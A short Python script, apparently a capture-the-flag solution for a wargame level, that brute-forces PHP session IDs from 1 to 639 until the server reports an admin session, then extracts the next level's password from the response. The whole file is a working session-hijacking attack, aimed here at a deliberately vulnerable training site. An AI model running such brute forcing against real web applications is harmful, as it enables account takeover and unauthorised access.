import Auther
for phpSessionId in range(1, 640):
    # 119
    print(f"Progress: {phpSessionId}/640")
    r = Auther.request(18, data={"username": "foo",
                                 "password": "bar"},
                       cookies={"PHPSESSID": f"{phpSessionId}"})
    # print(r.text)
    if "You are an admin" in r.text:
        print(f"Admin session id: {phpSessionId}")
        psw = next((line for line in r.text.splitlines() if line.startswith(
            "Password: ")), "").split(":")[1].strip()[0:32]
        Auther.updateAuth(19, psw)
        break
